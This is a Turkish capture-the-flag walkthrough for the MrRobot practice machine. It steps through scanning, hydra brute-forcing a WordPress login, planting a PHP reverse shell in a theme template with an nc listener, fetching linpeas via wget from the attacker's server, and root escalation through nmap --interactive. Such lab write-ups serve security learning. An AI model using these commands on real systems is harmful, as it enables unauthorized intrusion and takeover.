## MrRobot Türkçe Çözüm

İlk olarak ıp yi arama çubuğuna yapıştırarak mrrobot sitesine erişelim.Biraz gezinelim, MrRobot'un hayran sitesi tarzında bir site.Hemen nmap ve dirb taraması yapalım.
Bunun için terminalimizi açalım ve `sudo nmap -sS -sV -A IP` yazalım.

Kullandığımız flag'lerin anlamını bu yazımda yazmayacağım çünkü MrRobot odası orta seviye. Eğer flag'lerin ne işe yaradığını bilmiyorsanız terminale "nmap" yazarak ne anlama geldiğini öğrenebilirsiniz.

Bunun yanında bir de dirb araması yapalım bunun için; termianle `dirb http://IP` yazmamız yeterli olacaktır.Biraz bekledikten sonra dirb taraması bize `robots.txt`'nin var olduğunu söyleyecektir (veya kendi elimizle denersek :D, çoğunlukla el alışkanlığı olarak sitelere deneriz.)

Robots.txt'ye girerek (ip'nin sonuna /robots.txt yazın) erişebileceğimiz 2 dosya olduğunu görüyoruz.

Dosyalardan _fsocity.dic_'i bilgisayarımıza indirelim ve sonra da _key-1-of-3.txt_'yi deneyelim. Evet ilk flag'imizi bulduk. Şimdi sıra _fsocity.dic_'i incelemekte.

Bir çeşit brute force için yapılmış bir dosya gibi duruyor. İçerisinde bir sürü kelime barındırıyor; bunları sitenin admin panelini bulup brute force yapmak için kullanabiliriz.

Şimdi siteye geri dönelim, eğer biraz kurcalarsak (dirb'in bulduğu şeylere girip bakarsak mesela) sitenin aslında bir wordpress sitesi olduğunu öğreneceğiz. Bunun için dirb taramasından bulunan /atom'a bakarsak bir atom dosyası indirilecek bilgisayara.Dosyayı incelediğimizde **another wordpress site** yazısını görebiliriz.

Bundan sonra hemen admin paneline erişmek için /wp-login yazmamız yeterli çünkü wordpress sitelerinin admin paneline bu şekilde erişiliyor,tabi site sahibi değiştirmediyse (yani bu varsayılan).Şimdi **hydra** kullanarak indirdiğimiz _fsocity.dic_ dosyasını da birlikte kullanarak bir bruteforce yapalım.Burası biraz karmaşık gelebilir.

İlk önce şunu söylemem gerekli wordpress admin paneline giriş için herhangi bir kullanıcı adı ile şifre denediğimizde bize böyle bir kullanıcı adının olmadığını söylüyor.

Biz buraya eğer ki doğru kullanıcı adını girersek site bize bu kullanıcı adı için yanlış şifre girdiğimizi söylüyor.Bizim brute force yapabilmemiz için de kullanıcı adına ihtiyacımız var.

Biraz mantıklı düşündükten sonra (kullanıcı adı ne olabilir diye) elliot oldukça mantıklı geliyor :D ve deniyoruz.Kullanıcı adını böylece bulmuş olduk(burada bir şey söylemem gerek.Aslında kullanıcı adını tehmin etmemize gerek olmayabilirdi, indirdiğimiz fsocity.dic dosyasını kullanarak hydra ve burpsuite yardımıyla doğru kullanıcı adını bulabilirdik ama burası hem karmaşık hem de uzun olduğundan dolayı burayı es geçiyorum

.Size bunun hakkında bir video linki bırakıyorum fakat ingilizce :(( şifreyi de aynı şekilde çözeceğiz mutlaka bakmanızı öneriyorum.Kilit nokta doğru hata mesajını yazmakta,videoyu izledikten sonra analaycaksınız LİNK).Şimdi hydra ile bruteforce yapma zamanı.Az önce verdiğim videoda gerekli kodları nasıl çıkartacağımızı görebilirsiniz.Ben yazının uzamasını istemediğimden kodu buraya bırakıyorum (sudo hydra -l elliot -P ~/Desktop/deneme.txt IP -V http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect") kısaca bashetmek gerekirse -l flag'i kullanıcı adı yerine yazması gerektiği kelimeyi veya dosyayı yazıyor,yani yanına elliot yazıyoruz -P flag'i de şifre için dosya yazıyor.Şifre ve kullanıcı adını girmesi gereken yerleri; ^USER^ ve ^PASS^ şeklinde belirliyoruz(devamı videoda :D).Şifreyi bulması biraz uzun sürdüğünden dolayı size şifreyi buraya bırakıyorum ;) (ER28-0652).Şu anda admin panelinin içerisindeyiz.Tema düzenleyerek içeriye bir reverse shell yerleştirelim ve ana bilgisayara erişim kazanalım. Bunun için appearance kısmından editor kısmına giriyoruz ve 404template'i düzenliyoruz. reverse shell php kodumuzu buraya yapıştıracağız ama bundan önce size reverse shell dosyası vereyim :D bu dosyada değiştirilmesi gereken ip ve port kısmı var ip ye kendi ip mizi yapışıtırıyoruz sonra terminali açıp nc -lvnp 4444 yazıyoruz (4444 port, istediğinizi yazabilirsiniz) şu anda kendi ip'miz üzerindeki 4444 portunu dinliyoruz.Şimdi reverse shell dosyasındaki port kısmında dineldiğimiz portu yazıyoruz (4444 yazmıştım ben) yazıyoruz.Şimdi o tüm yazıları kopyalayıp editor kısmındaki 404 template ye yapıştırıyoruz.Alt taraftan update file dedikten sonra ıp/404.php yazarak kodumuzu aktifleştiriyoruz.Dinlemeye aldığımız terminale bakarsak shell'imiz geldi (ana bilgisayara erişim).Bu shell oldukça kullanışsız eğer bu shell'i geliştirmezsek istediğimiz şeyleri kullanamayız mesela sudo -l.Bu yüzden shell'i kullanışlı hale getirelim yani bir nevi üst sürüme taşıyalım.Bunun için basit bir python kodu kullanacağız.Nasıl çalıştığını burada açıklamayacağım.python kodu :(python -c 'import pty; pty.spawn("/bin/bash")').Bu kodu terminale yapıştrın veee işte! Güzel,kullanışlı bir shell'imiz oldu.Artık istediğimizi yapabiliriz.Şimdi terminalde "ls" yaptığımız zaman bir sürü dosya göreceğiz.Biz home'a girelim,bunun için cd home yapalım.İçinde robot klasörü var.Onun içinde de 2.flag'imiz ve bir dosya var.2 dosyayı da cat edelim.Gördüğünüz gibi flag dosyasını açamadık çünkü yetkimiz yetmedi ama password dosyası açıldı.Hemen kullanıcı değiştirmeyi deneyelim bunun için "su robot" yazalım ve robotun karşısındaki şifreyi girelim (yani yapıştıralım :D).Şifrenin yanlış olduğunu anlamış olduk.Demek ki bu elimizdeki rastgele gibi yazılmış olan şey bir şifreli yazıymış.Bunun için online olarak bu tür kodları çevirebileceğimiz siteler.Var benim kullandığım site bu LİNK.Şifremizi bulduğumuza göre şimdi bir kez daha "su robot" yapabiliriz.Evet, kullanıcı yetkimizi robot kullanıcısına yükseltmiş olduk.Şimdi açamadığım flag dosyasını açmayı deneyelim.Açıldı, 2.flag'imizi bulmuş olduk.Şimdi sıra 3.flag'de.Bunun için tekrar dosyalara göz atmaya başlayalım.Root dosyasına girmek istediğimizde yetkimizin yeterli olmadığını söylüyor.Kendimizi root kullanıcısına yükseltmemiz gerekiyor.Bunun için oldukça basit bir numara var terminale "sudo -l" yazdığımız zaman hangi uygulamaları root yetkisine ihtiyaç olmadan kullanabileceğimizi gösteriyor.Hemen denersek ve robot için olan şifreyi girersek maalesef ki robot kullanıcısının sudo komutunu kullanamadığını görüyoruz (offf amma uğraşıtrdı :D).Şimdi yapmamız gereken şey linpeas uygulamasını bu bilgisayara aktarmak ve sonra da çalıştırmak.Linpeas uygulaması da "sudo -l" komutunun yaptığı işin biraz abartılı ve detaylsını yapıyor. Kısacası neredeyse root'suz yani sudo komutu olmadan kullanabileceğim her şeyi gösteriyor.Bunun için sizin de linpeas uygulamasına ihtiyacınız olacak o yüzden buraya linkin bırakıyorum LİNK.İlk olarak kendi bilgisayarımızda bir server oluşturacağız ve diğer bilgisayardan bağlanarak linpeas uygulamasını çekeceğiz.Bunun için terminale (python -m SimpleHTTPServer ) yazıyoruz.Serverimiz oluşturuldu ve portumuz da terminalde yazıyor.Şimdi öbür terminale yani kurban bilgisayara geçip;cd /tmp/ yapıyoruz çünkü bir tek tmp klasörüne bir şeyler yazma iznimiz var.Sonrasında "wget IP:PORT/linpeas.konumu(/Desktop/linpeas.sh)" şeklinde yazıyoruz.Linpeas indirildi şimdi ilk olarak "chmod +x linpeas.sh yazıp kullanılabilir hale getiriyoruz.Sonrasında ./linpeas.sh yazıp uygulamayı açıyoruz.Resimde de görüldüğü gibi "nmap" rootsuz kullanılabilir.İnternette nmap açığını kullanarak nasıl root yetkisine kavuşabileceğimizi araştıralım.Benim en çok kullandığım site (GTFObins).Bu sitede arama kısmına nmap yazalım ve bize root'a kavuşmamız için kodları göstersin.Bu kod işimize yarayacak (nmap --interactive nmap> !sh).İlk olarak nmap --interactive yazalım ve nmap açılsın, nmap> işareti çıkınca da ! sh yazalım.# geldiğine göre artık istediğimizi yapabiliriz.Hemen root konumuna gidelim ve bayrağımızı alalım.
